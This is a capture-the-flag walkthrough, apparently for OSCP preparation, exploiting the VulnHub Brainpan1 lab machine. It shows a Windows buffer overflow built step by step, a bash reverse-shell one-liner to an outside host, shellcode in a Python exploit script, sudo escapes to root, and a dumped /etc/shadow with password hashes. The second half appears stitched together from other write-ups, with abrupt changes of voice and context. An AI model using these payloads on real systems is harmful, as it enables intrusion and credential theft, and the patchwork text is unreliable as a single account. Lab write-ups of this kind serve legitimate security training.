---
title: 'OSCP exam Preparation BufferOverFlow Brainpan1 Walkthrough'
date: 2019-11-27T21:22:00+01:00
draft: false
---

  

**Download Link:** [https://www.vulnhub.com/entry/brainpan-1,51/](https://www.vulnhub.com/entry/brainpan-1,51/)  

### VM Details – From the Author

*   _By using this virtual machine, you agree that in no event will I be liable for any loss or damage including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of or in connection with the use of this software._
*   _TL;DR: If something bad happens, it’s not my fault._
*   __SETUP  
    —–  
    Brainpan has been tested and found to work on the following hypervisors:  
    – VMware Player 5.0.1  
    –    VMWare Fusion 5.0  
    –    VirtualBox 4.2.8__Import Brainpan into your preferred hypervisor and configure the network settings to your needs. It will get an IP address via DHCP, but it’s recommended you run it within a NAT or visible to the host OS only since it is vulnerable to attacks.

### Walkthrough

1\. Download the Brainpan VM from above link and provision it as a VM.  
2\. Following the routine from the series, let’s try to find the IP of this machine using netdiscover. Below, we can see that the IP address is discovered to be 192.168.213.133. **\[CLICK EACH IMAGE TO ENLARGE\]**  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/1-205.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/1-205.png)  
**<\>**  
3\. Let’s perform an nmap scan on this. Below are the results of the nmap scan, where port 9999 and http running on 10000 were detected.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/2-177.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/2-177.png)  
**<\>**  
4\. Let’s start to dig what is inside them. Start with http one. I started gobuster at the back end as well and found a bin directory in which we can see that an .exe named brainpan is present. Since it is an .exe file, I need to evaluate the file in my Windows 7 lab machine.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/3-140.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/3-140.png)  
5\. Download brainpan.exe and drop it to the Windows 7 lab machine. Below we can see that brainpan.exe is running and waiting for connection on port 9999.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/4-102.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/4-102.png)  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/5-90.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/5-90.png)6\. Looking into the strings into this .exe revealed use of some vulnerable functions, as we can see below.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/6-56.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/6-56.png)  
**<\>**  
7\. As is done in the previous write-ups, let’s send a large buffer of As to the socket on 9999 and see what happens. Below, we can see that the .exe crashed. Looking into the Error report revealed that EIP is overwritten by our custom input (the buffer of As).  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/7-53.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/7-53.png)  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/8-37.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/8-37.png)  
8\. Before I proceed further, I see a string (“shitstorm”) embedded just alongside the other register. Tried it as the password for the .exe, but it failed.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/9-35.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/9-35.png)  
**<\>**  
9\. Now let’s follow the same routing to exploit the buffer overflow as we have done previously in this series. To find the exact offset at which the current buffer of As are overwriting EIP, let’s use the pattern created from Kali and embed that into the script, as is shown below.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/10-30.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/10-30.png)  
10\. We can see that the new buffer has overwritten EIP at location 35724134.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/11-27.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/11-27.png)  
11\. Using the pattern offset from Kali, the offset position is found to be 524.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/12-25.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/12-25.png)  
**<<./pattern\_offset.rb -q 35724134>>**  
12\. As per the offset position found, let’s try to recreate our buffer as shown below. This will consist of 524 As, 4 Bs and rest Cs (out of 1000 characters in the original buffer).  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/13-21.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/13-21.png)  
13\. After executing the above buffer, we can see that how cleanly As, Bs and Cs have overwritten the registers. An important point to note here is that the Bs have completely overwritten EIP, which means now we can control this location and use it to point to our buffer. We are going to place our malicious buffer in ESP, so we need an instruction such as JMP ESP to be placed in EIP so that it points to our buffer.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/14-20.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/14-20.png)  
14\. In order to overwrite the Bs with a constant location, we will use mona modules and locate the module which does not have flags such as ASLR. Below, we can see that brainpan.exe itself has all the flags turned off.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/15-21.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/15-21.png)  
**<\>**  
15\. Looking further into the brainpan.exe, we found out that there is an instruction JMP ESP in the module brainpan. So let’s embed this instruction location in our script in place of Bs.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/16-18.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/16-18.png)  
16\. Below, we can see that we have the instruction address 0x311712F3 in little endian format in our script.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/17-17.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/17-17.png)  
17\. Below, we tested whether we will able to hit the address mentioned above and the value is present in EIP. It all appeared positive.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/18-12.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/18-12.png)  
Ethical Hacking Boot Camp — 93% Exam Pass Rate  
18\. Now we need to test for a badchar. We create a unique buffer and pass that in place of Cs, as shown below:  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/19-12.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/19-12.png)  
19\. If we observe the output carefully by looking into the contents of the ESP register, we can see that the ‘\\x00’ is the bad char and resulted in an access violation.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/20-10.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/20-10.png)  
20\. Now we have all the points collected to exploit the buffer overflow. We just need to create the payload now to get the reverse shell back. Below, we use msfvenom to generate the Windows reverse shell. But why Windows? Remember, we are doing all this testing in our Windows 7 lab machine.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/21-8.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/21-8.png)  
**<\>**  
21\. Use the generated output as our buffer, replace it with the badchar buffer and execute it.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/22-9.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/22-9.png)[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/23-9.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/23-9.png)  
22\. We can see that we have received the reverse shell back!  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/24-5.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/24-5.png)  
**<\>**  
23\. Now we need to just change the IP of the machine to that of our Brainpan VM in the script and execute the script.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/25-3.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/25-3.png)  
24\. Below, we can see that we also got the reverse shell back from our Brainpan machine.  
[![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/26-2.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/26-2.png)  
**<\>  
****<>**  
So we got the reverse shell back! In Part 2 of this machine, we will look into two different ways of gaining the root shell on this machine.  
  
  
method 1  
  
Checking the \\home\\ directory and using echo I’m able to find out what user I’m logged in as, as well as other possible user options.  I’m blocked from \\root\\, however, and will at this point need to find some way to elevate my privileges.  
I may be in a MS cmd shell, but I can still run bash.  I can then use the following to upgrade to full TTY:  
**python -c ‘import pty; pty.spawn(“/bin/bash”)’**  
Except it seems to only partially work…and keeps kicking me back to the Windows cmd shell.  
[![](https://i1.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/weirdhybridmix.jpg?resize=484%2C114&ssl=1)](https://i1.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/weirdhybridmix.jpg?ssl=1)  
I decide I should try to make things easier on myself by creating a new Linux shell back to Kali.  I used [Pentestmonkey’s](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Bash shell:  
```
bash -i >& /dev/tcp/192.168.111.101/6666 0>&1
```[![](https://i2.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/realshell.jpg?resize=525%2C364&ssl=1)](https://i2.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/realshell.jpg?ssl=1)  
Took 2 tries but that worked like a charm and now I have a real shell!  
Lots of poking around later going down the list of [Basic Linux Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) possibilities I came across this tidbit:  
[![](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/sudol.jpg?resize=525%2C106&ssl=1)](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/sudol.jpg?ssl=1)  
I don’t have access to that user’s home directory so can’t really inspect anything around the application, so let’s just try running it and see what it does.  
[![](https://i1.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/sudoanansiutil.jpg?resize=463%2C127&ssl=1)](https://i1.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/sudoanansiutil.jpg?ssl=1)  
I try out the manual option.  
[![](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/terminalnotfullyoperational.jpg?resize=525%2C397&ssl=1)](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/terminalnotfullyoperational.jpg?ssl=1)  
Note the “terminal is not fully functional” message.  This is fixed using “export TERM=xterm”.  The question now is how do we exploit “network”, “proclist” or “manual” to attach further commands to give us shell?  
I can’t just tack on additional commands to the string. We don’t have rights to modify “anansi\_util” itself.  “network” and “proclist” are straightforward commands so I’m not sure I can do anything with those.  
I was stuck here for quite a while putzing around trying to figure out what to do.   Strangely it was me accidentally messing up hitting ctrl-c and having to redo the session that led me to the answer.  My “fix” above was actually preventing me from exploiting a breakout from the manual “less” listing.  
[![](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/root.jpg?resize=525%2C191&ssl=1)](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/root.jpg?ssl=1)  
At the “press RETURN” prompt, you can escape to shell using “!/bin/sh” while still under sudo privileges.  We now have root finally!  
[![](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/flag.jpg?resize=525%2C269&ssl=1)](https://i0.wp.com/blog.vonhewitt.com/wp-content/uploads/2017/11/flag.jpg?ssl=1)  
And there we have it!  Great challenge and some good practice doing Windows buffer overflow.  
  
  
  
method 2'  
  
Additionally, after scanning the binary for jumps, it appeared that I would only be able to jump to EAX, and not ESP, anyway.  
```
root@kali:~\# msfelfscan -j esp validate  
\[validate\]   
root@kali:~\# msfelfscan -j eax validate  
\[validate\]  
0x080484af call eax  
0x0804862b call eax  

```With all of this in mind, it was time for me to generate a new shellcode (CMD since I was already on the target machine) and update the exploit.  
```
root@kali:~\# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0a\\x0d'  
No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
No Arch selected, selecting Arch: x86 from the payload  
Found 22 compatible encoders  
Attempting to encode payload with 1 iterations of x86/shikata\_ga\_nai  
x86/shikata\_ga\_nai succeeded with size 70 (iteration=0)  
  
< ... snip ... >  
  
root@kali:~\# cat brainpan2.py  
payload = ""  
payload += "\\xda\\xd1\\xd9\\x74\\x24\\xf4\\x5f\\x31\\xc9\\xb1\\x0b\\xbd\\xc8"  
payload += "\\x44\\x38\\xb5\\x31\\x6f\\x1a\\x83\\xef\\xfc\\x03\\x6f\\x16\\xe2"  
payload += "\\x3d\\x2e\\x33\\xed\\x24\\xfd\\x25\\x65\\x7b\\x61\\x23\\x92\\xeb"  
payload += "\\x4a\\x40\\x35\\xeb\\xfc\\x89\\xa7\\x82\\x92\\x5c\\xc4\\x06\\x83"  
payload += "\\x57\\x0b\\xa6\\x53\\x47\\x69\\xcf\\x3d\\xb8\\x1e\\x67\\xc2\\x91"  
payload += "\\xb3\\xfe\\x23\\xd0\\xb4"  
  
payload += "\\x90" \* (116-70)  # NOPs to fill rest of offset  
  
#payload += "BBBB"  
  
payload += "\\xaf\\x84\\x04\\x08"  # call eax  
  
payload += "\\x90"\*180  
  
print payload  

```Just to make sure the exploit worked, I ran it on my attacker box one last time and got a shell.  
```
root@kali:~\# ./validate \`python brainpan2.py\`  
\# id  
uid=0(root) gid=0(root) groups=0(root)  
\# exit  

```Heading back over to the vulnerable machine, I was indeed able to run the exploit and obtain a shell as the anansi user.  
```
puck@brainpan:/usr/local/bin$ ./validate \`python ~/exploit.py\`  
./validate \`python ~/exploit.py\`  
$ id  
id  
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)  

```Remembering the information from before, I headed over to anansi's home directory to check out the anansi\_util executable.  
```
$ cd /home/anansi  
cd /home/anansi  
$ ls -al  
ls -al  
total 32  
drwx------ 4 anansi anansi 4096 Mar  4  2013 .  
drwxr-xr-x 5 root   root   4096 Mar  4  2013 ..  
\-rw------- 1 anansi anansi    0 Mar  5  2013 .bash\_history  
\-rw-r--r-- 1 anansi anansi  220 Mar  4  2013 .bash\_logout  
\-rw-r--r-- 1 anansi anansi 3637 Mar  4  2013 .bashrc  
drwx------ 2 anansi anansi 4096 Mar  4  2013 .cache  
\-rw------- 1 root   root     39 Mar  4  2013 .lesshst  
\-rw-r--r-- 1 anansi anansi  675 Mar  4  2013 .profile  
drwxrwxr-x 2 anansi anansi 4096 Mar  5  2013 bin  
$ cd bin  
cd bin  
$ ls -al  
ls -al  
total 16  
drwxrwxr-x 2 anansi anansi 4096 Mar  5  2013 .  
drwx------ 4 anansi anansi 4096 Mar  4  2013 ..  
\-rwxr-xr-x 1 anansi anansi 7256 Mar  4  2013 anansi\_util  

```Since anansi\_util was writable by anansi, and was executable by root with no password, this would be a simple privilege escalation. I copied over /bin/bash to replace anansi\_util, and was able to sudo it as root, giving me my root shell.  
```
$ mv anansi\_util anansi\_util.bak  
mv anansi\_util anansi\_util.bak  
$ cp /bin/bash anansi\_util  
cp /bin/bash anansi\_util  
$ sudo ./anansi\_util  
sudo ./anansi\_util  
root@brainpan:/home/anansi/bin# id  
id  
uid=0(root) gid=0(root) groups=0(root)  

```Once I was root, I was able to grab the flag file, and finish up this VM.  
```
root@brainpan:~# cat b.txt  
cat b.txt  
\_|                            \_|                                         
\_|\_|\_|    \_|  \_|\_|    \_|\_|\_|      \_|\_|\_|    \_|\_|\_|      \_|\_|\_|  \_|\_|\_|   
\_|    \_|  \_|\_|      \_|    \_|  \_|  \_|    \_|  \_|    \_|  \_|    \_|  \_|    \_|  
\_|    \_|  \_|        \_|    \_|  \_|  \_|    \_|  \_|    \_|  \_|    \_|  \_|    \_|  
\_|\_|\_|    \_|          \_|\_|\_|  \_|  \_|    \_|  \_|\_|\_|      \_|\_|\_|  \_|    \_|  
                                            \_|                           
                                            \_|  
  
  
                                              http://www.techorganic.com   

```And, as usual, I grabbed the shadow file for possible future consumption.  
```
root@brainpan:~# cat /etc/shadow  
cat /etc/shadow  
root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdOhg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZaDioh0:15768:0:99999:7:::  
daemon:\*:15768:0:99999:7:::  
bin:\*:15768:0:99999:7:::  
sys:\*:15768:0:99999:7:::  
sync:\*:15768:0:99999:7:::  
games:\*:15768:0:99999:7:::  
man:\*:15768:0:99999:7:::  
lp:\*:15768:0:99999:7:::  
mail:\*:15768:0:99999:7:::  
news:\*:15768:0:99999:7:::  
uucp:\*:15768:0:99999:7:::  
proxy:\*:15768:0:99999:7:::  
www-data:\*:15768:0:99999:7:::  
backup:\*:15768:0:99999:7:::  
list:\*:15768:0:99999:7:::  
irc:\*:15768:0:99999:7:::  
gnats:\*:15768:0:99999:7:::  
nobody:\*:15768:0:99999:7:::  
libuuid:!:15768:0:99999:7:::  
syslog:\*:15768:0:99999:7:::  
messagebus:\*:15768:0:99999:7:::  
reynard:$6$h54J.qxd$yL5md3J4dONwNl.36iA.mkcabQqRMmeZ0VFKxIVpXeNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::  
anansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xvJa3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1lyDGIPE1:15768:0:99999:7:::  
puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEmbIcBF9Oi7q2eAi0TMMqOhg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::  

```Definitely an enjoyable VM with a few different custom exploits needed. I look forward to finishing up parts 2 and 3 soon, but this is one I'd recommend to people wanting to practice their exploit development for sure.